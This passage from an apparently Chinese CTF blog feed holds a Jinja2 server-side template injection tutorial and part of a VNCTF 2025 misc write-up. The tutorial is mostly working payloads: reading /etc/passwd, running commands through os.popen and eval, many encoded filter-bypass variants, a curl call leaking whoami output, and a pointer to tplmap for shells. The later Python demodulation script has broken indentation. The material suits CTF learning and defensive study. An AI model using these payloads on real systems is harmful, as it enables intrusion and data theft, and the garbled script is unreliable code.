        print c(&#x27;joker.txt&#x27;).readlines()</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png" alt="img"></a></p>
<p>上述代码先通过<code>__class__</code>获取字典对象所属的类，再通过<code>__base__</code>（<code>__bases[0]__</code>）拿到基类，然后使用<code>__subclasses__()</code>获取子类列表，在子类列表中直接寻找可以利用的类</p>
<p>为了方便理解，我直接把获取到的子类列表打印出来：</p>
<pre><code class="highlight plaintext">for c in &#123;&#125;.__class__.__base__.__subclasses__():
        print(c)</code></pre>

<p> 打印结果如下（python2.7.5）：</p>
<pre><code class="highlight plaintext">&lt;type &#x27;type&#x27;&gt;
&lt;type &#x27;weakref&#x27;&gt;
&lt;type &#x27;weakcallableproxy&#x27;&gt;
&lt;type &#x27;weakproxy&#x27;&gt;
&lt;type &#x27;int&#x27;&gt;
&lt;type &#x27;basestring&#x27;&gt;
&lt;type &#x27;bytearray&#x27;&gt;
&lt;type &#x27;list&#x27;&gt;
&lt;type &#x27;NoneType&#x27;&gt;
&lt;type &#x27;NotImplementedType&#x27;&gt;
&lt;type &#x27;traceback&#x27;&gt;
&lt;type &#x27;super&#x27;&gt;
&lt;type &#x27;xrange&#x27;&gt;
&lt;type &#x27;dict&#x27;&gt;
&lt;type &#x27;set&#x27;&gt;
&lt;type &#x27;slice&#x27;&gt;
&lt;type &#x27;staticmethod&#x27;&gt;
&lt;type &#x27;complex&#x27;&gt;
&lt;type &#x27;float&#x27;&gt;
&lt;type &#x27;buffer&#x27;&gt;
&lt;type &#x27;long&#x27;&gt;
&lt;type &#x27;frozenset&#x27;&gt;
&lt;type &#x27;property&#x27;&gt;
&lt;type &#x27;memoryview&#x27;&gt;
&lt;type &#x27;tuple&#x27;&gt;
&lt;type &#x27;enumerate&#x27;&gt;
&lt;type &#x27;reversed&#x27;&gt;
&lt;type &#x27;code&#x27;&gt;
&lt;type &#x27;frame&#x27;&gt;
&lt;type &#x27;builtin_function_or_method&#x27;&gt;
&lt;type &#x27;instancemethod&#x27;&gt;
&lt;type &#x27;function&#x27;&gt;
&lt;type &#x27;classobj&#x27;&gt;
&lt;type &#x27;dictproxy&#x27;&gt;
&lt;type &#x27;generator&#x27;&gt;
&lt;type &#x27;getset_descriptor&#x27;&gt;
&lt;type &#x27;wrapper_descriptor&#x27;&gt;
&lt;type &#x27;instance&#x27;&gt;
&lt;type &#x27;ellipsis&#x27;&gt;
&lt;type &#x27;member_descriptor&#x27;&gt;
&lt;type &#x27;file&#x27;&gt;
&lt;type &#x27;PyCapsule&#x27;&gt;
&lt;type &#x27;cell&#x27;&gt;
&lt;type &#x27;callable-iterator&#x27;&gt;
&lt;type &#x27;iterator&#x27;&gt;
&lt;type &#x27;sys.long_info&#x27;&gt;
&lt;type &#x27;sys.float_info&#x27;&gt;
&lt;type &#x27;EncodingMap&#x27;&gt;
&lt;type &#x27;fieldnameiterator&#x27;&gt;
&lt;type &#x27;formatteriterator&#x27;&gt;
&lt;type &#x27;sys.version_info&#x27;&gt;
&lt;type &#x27;sys.flags&#x27;&gt;
&lt;type &#x27;exceptions.BaseException&#x27;&gt;
&lt;type &#x27;module&#x27;&gt;
&lt;type &#x27;imp.NullImporter&#x27;&gt;
&lt;type &#x27;zipimport.zipimporter&#x27;&gt;
&lt;type &#x27;posix.stat_result&#x27;&gt;
&lt;type &#x27;posix.statvfs_result&#x27;&gt;
&lt;class &#x27;warnings.WarningMessage&#x27;&gt;
&lt;class &#x27;warnings.catch_warnings&#x27;&gt;
&lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;
&lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;
&lt;class &#x27;_abcoll.Hashable&#x27;&gt;
&lt;type &#x27;classmethod&#x27;&gt;
&lt;class &#x27;_abcoll.Iterable&#x27;&gt;
&lt;class &#x27;_abcoll.Sized&#x27;&gt;
&lt;class &#x27;_abcoll.Container&#x27;&gt;
&lt;class &#x27;_abcoll.Callable&#x27;&gt;
&lt;class &#x27;site._Printer&#x27;&gt;
&lt;class &#x27;site._Helper&#x27;&gt;
&lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;
&lt;type &#x27;_sre.SRE_Match&#x27;&gt;
&lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;
&lt;class &#x27;site.Quitter&#x27;&gt;
&lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;
&lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;</code></pre>

<p>使用dir来看一下file这个子类的内置方法：</p>
<pre><code class="highlight plaintext">dir(().__class__.__bases__[0].__subclasses__()[40])</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png" alt="img"></a></p>
<p>将要读取的文件传进入并使用readlines()方法读取，就相当于：</p>
<pre><code class="highlight plaintext">file(&#x27;joker.txt&#x27;).readlines()</code></pre>

<p>可以在python交互终端中尝试输出：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png" alt="img"></a></p>
<p>再使用jinja2的语法封装成可解析的样子：</p>
<pre><code class="highlight plaintext">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__==&#x27;file&#x27; %&#125;
&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png" alt="img"></a></p>
<p>不过我这边一直没有读取成功，原因是：<strong>python3已经移除了file。所以利用file子类文件读取只能在python2中用。</strong></p>
<p>docker容器默认使用python3版本</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png" alt="img"></a></p>
<p><strong>用内置模块执行命令</strong></p>
<p>上面的实例中我们使用dir把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有<code>os</code>这种可以直接传入命令，造成命令执行</p>
<pre><code class="highlight plaintext">#coding:utf-8search = &#x27;os&#x27;   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png" alt="img"></a></p>
<p>可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p>
<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
().__class__.__base__.__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)
().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</code></pre>

<p>在python交互终端中尝试输出：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png" alt="img"></a></p>
<p><strong>不过同样，只能在python2版本使用</strong></p>
<p>这时候就要推荐<code>__builtins__</code>：</p>
<pre><code class="highlight plaintext">#coding:utf-8

search = &#x27;__builtins__&#x27;
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        print(i.__init__.__globals__.keys())
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass</code></pre>

<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png" alt="img"></a></p>
<p>这时候我们的命令执行payload就出来了：<br>python3：</p>
<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>

<p>python2：</p>
<pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>

<p>在python交互终端中尝试输出：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png" alt="img"></a></p>
<p>实际注入效果：</p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png" alt="img"></a></p>
<p>既然大概知道原理跟利用，我这里不再废话，直接给出大佬们各种绕过payload：</p>
<h4 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a><strong>基础payload</strong></h4><pre><code class="highlight plaintext">获得基类
#python2.7
&#x27;&#x27;.__class__.__mro__[2]
&#123;&#125;.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
&#x27;&#x27;.__。。。class__.__mro__[1]
&#123;&#125;.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp&#x27;).write(&#x27;test&#x27;)

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()

#python3.7
#命令执行
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
#文件操作
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
#windows下的os命令
&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</code></pre>

<p> <strong>一些绕waf的姿势：</strong></p>
<p><strong>过滤[</strong></p>
<pre><code class="highlight plaintext">#getitem、pop
&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()
&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</code></pre>

<p><strong>过滤引号</strong></p>
<pre><code class="highlight plaintext">#chr函数
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
#命令执行
&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
#request 绕过
&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
\#分析：
request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
若args被过滤了，还可以使用values来接受GET或者POST参数。：
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
Cookie:arg1=open;arg2=/etc/passwd
&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
post:arg1=open&amp;arg2=/etc/passwd</code></pre>

<p><strong>过滤下划线</strong></p>
<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre>

<p><strong>过滤花括号</strong></p>
<pre><code class="highlight plaintext">#用&#123;%%&#125;标记
&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</code></pre>

<p><strong>过滤关键字</strong></p>
<ul>
<li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>

<ul>
<li>反转</li>
</ul>
<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>

<ul>
<li>利用”+”进行字符串拼接，绕过关键字过滤。</li>
</ul>
<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;</code></pre>

<ul>
<li>join拼接</li>
</ul>
<p>利用join（）函数绕过关键字过滤</p>
<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;</code></pre>

<ul>
<li>利用引号绕过</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>

<ul>
<li>使用str原生函数replace替换</li>
</ul>
<p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>ascii转换</li>
</ul>
<pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。

&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>

<ul>
<li>16进制编码绕过</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;

例子：
&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
\
同理，也可使用八进制编码绕过</code></pre>

<ul>
<li><p>base64编码绕过</p>
<p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
</li>
</ul>
<pre><code class="highlight plaintext">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>

<p>例子：</p>
<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
等价于  
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>

<ul>
<li>unicode编码绕过</li>
</ul>
<pre><code class="highlight plaintext">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>

<ul>
<li>Hex编码绕过</li>
</ul>
<pre><code class="highlight plaintext">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
等价于   
&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;

&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>

<ul>
<li>绕过init<br>可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li>
</ul>
<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>

<p><strong>利用示例：</strong></p>
<pre><code class="highlight plaintext">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;
  &#123;% for b in c.__init__.__globals__.values() %&#125;
  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;
      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;         //popen的参数就是要执行的命令
    &#123;% endif %&#125;
  &#123;% endif %&#125;
  &#123;% endfor %&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;</code></pre>

<p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p>
<p>github地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png" alt="img"></a></p>
<p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
<h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
<p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2025</title>
    <url>/2025/02/10/VNCTF2025/</url>
    <content><![CDATA[<h1 id="VNCTF-2025"><a href="#VNCTF-2025" class="headerlink" title="VNCTF 2025"></a>VNCTF 2025</h1><p>入坑CTF以来打过最难的个人赛，打完的表情就像先辈的一张表情包一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e7584e8da9773912fec999bbbd198618347ae2dc.jpg" alt="img"></p>
<p>比赛期间就出了一题，这才是正统misc吗哈哈(</p>
<h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a><strong>VN_Lang</strong></h2><p>不能较真的签到题，附件一个exe,一个莫名其妙的源代码。看起来花里胡哨，实际010一查就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180505746.png" alt="image-20250210180505746"></p>
<h2 id="echo-flowers"><a href="#echo-flowers" class="headerlink" title="echo_flowers"></a>echo_flowers</h2><p>区块链的基本知识和取证搭配的好题。大概?</p>
<p>给了一个安卓的镜像，先VM开了，不得不吐槽的一点是，操作是真吃力啊。。。</p>
<p>先放个hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180853422.png" alt="image-20250210180853422"></p>
<p>我没有那么多知识储备，所以其实能用的hint也不多，就一个软件本身没有缓存<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210180951701.png" alt="image-20250210180951701"></p>
<p>看到干干净净的桌面其实就能感觉到不对劲了哈哈，连文件管理都没有还整什么，果断放弃仿真取证。挂DiskGenius</p>
<p>既然说软件本身没有任何缓存。。那么从哪里入手呢，其实和bashhistory有点相似吧(刚好之前看到过类似的题目)</p>
<p>也就是，从输入法的缓存，或者说，输入的记录入手。</p>
<p>定位交给AI<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181822981.png" alt="image-20250210181822981"></p>
<p>正好我们是可以找到files这一文件夹的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210181930421.png" alt="image-20250210181930421"></p>
<p>接下来一个个看过去其实也可以，最终是可以定位到sgim_gd_usr.bin这个文件的,当然按理来说我们应该先排查.db，.dat，.log这类文件的<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210182036252.png" alt="image-20250210182036252"></p>
<p>最终找到助记词ranch only space define laundry carpet muscle ramp high twenty couch fashion</p>
<p>挂上Metamask,记得一定要用没用使用过metamask的浏览器，因为如果你有账户你要导入一般是会让你直接输入密钥登录的</p>
<p>接下来按照指示输入助记词，重置密码，点击你的账户-&gt;账户详情-&gt;查看密钥就结束了</p>
<h2 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h2><p>C3师傅的旷世之作(不仅指半夜更新附件)</p>
<p>当然其实C3师傅给的hint已经相当多了，或者说，都已经把解题步骤告诉你了哈哈(</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183042001.png" alt="image-20250210183042001"></p>
<p>直接解压会碰到这个问题，那么有人就要问了为什么呢</p>
<p>查下或者根据提示可以发现包里是有一个名字为空格的文件的，而在Windows系统中这种文件是不会被显示的.当然在不知道这点的前提下，可以观察一下压缩包的结构</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183450579.png" alt="image-20250210183450579"></p>
<p>可以明显看到frFileNameLength是1，并且文件名显示的是’ ‘</p>
<p>那么将压缩包复制到Ubuntu</p>
<pre><code class="highlight bash">unzip ezSignal_fix.zip
<span class="built_in">mv</span> <span class="string">&#x27; &#x27;</span> 2</code></pre>

<p>再复制回来，010查一下2,<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210183802628.png" alt="image-20250210183802628"></p>
<p>问一下AI，知道是一个grc文件，搭配<a href="https://wiki.gnuradio.org/index.php/InstallingGR">GNU</a>使用，改后缀为grc</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250210184040460.png" alt="image-20250210184040460"></p>
<p>喂AI&#x2F;看hint,这是一个窄带调谐+将复数信号转换为虚部实部分别输出的过程，而我们的任务是逆向一下它，写个Python脚本。(赛后C3说可以Cyber chef，可以Linux。。诶我怎么和我的电脑一个温度了)</p>
<p>喂了半天ChatGPT报错报了一下午＋一晚上，活全家了哈哈()</p>
<p>抱着试一试的心情给Deepseek跑了一下，两遍过，最支持国产的一集。。。</p>
<pre><code class="highlight plaintext">import numpy as np
from scipy.io import wavfile
from scipy.signal import butter, lfilter

def read_gr_file(filename, dtype=np.float32, endian=&quot;&lt;&quot;):
    &quot;&quot;&quot;
    读取 GRC 生成的二进制文件（如 blocks_file_sink 的输出）
    - dtype: 数据类型（默认 float32）
    - endian: 字节序（默认小端序 &quot;&lt;&quot;，大端序用 &quot;&gt;&quot;）
    &quot;&quot;&quot;
    # 以二进制模式读取文件
    with open(filename, &quot;rb&quot;) as f:
        raw_bytes = f.read()
    

# 转换为指定字节序和类型的 numpy 数组

dt = np.dtype(f&quot;&#123;endian&#125;&#123;dtype().dtype.char&#125;&quot;)
data = np.frombuffer(raw_bytes, dtype=dt)
return data

def main():

    # 参数配置（与 GRC 一致）

     samp_rate = 48000      # 音频采样率
     if_rate = 192000       # 中频速率（usrp_rate/3 = 576000/3）
     max_dev = 5e3          # FM最大频偏
     endian = &quot;&lt;&quot;           # 字节序（GRC 默认小端序）

try:

    # 1. 读取I/Q数据（二进制模式）

     i_data = read_gr_file(&quot;flag1.txt&quot;, dtype=np.float32, endian=endian)
     q_data = read_gr_file(&quot;flag2.txt&quot;, dtype=np.float32, endian=endian)

    # 检查长度一致性

     if len(i_data) != len(q_data):
         raise ValueError(&quot;I/Q数据长度不一致！&quot;)

    # 2. 合并为复数信号（I + jQ）

     complex_signal = i_data + 1j * q_data

    # 3. FM解调（相位差分法）

     phase = np.unwrap(np.angle(complex_signal))
     demodulated = np.diff(phase) / (2 * np.pi * max_dev) * if_rate
     demodulated = demodulated.astype(np.float32)

    # 4. 重采样到音频采样率（48 kHz）

     demodulated_resampled = demodulated[::4]  # 简单下采样

    # 5. 低通滤波（300-5000 Hz，与GRC一致）

     b, a = butter(4, 5000, fs=samp_rate, btype=&#x27;low&#x27;)
     demodulated_resampled = lfilter(b, a, demodulated_resampled)

    # 6. 归一化并保存为WAV

     demodulated_resampled /= np.max(np.abs(demodulated_resampled)) * 1.2
     wavfile.write(&quot;flag_recovered.wav&quot;, samp_rate, demodulated_resampled)

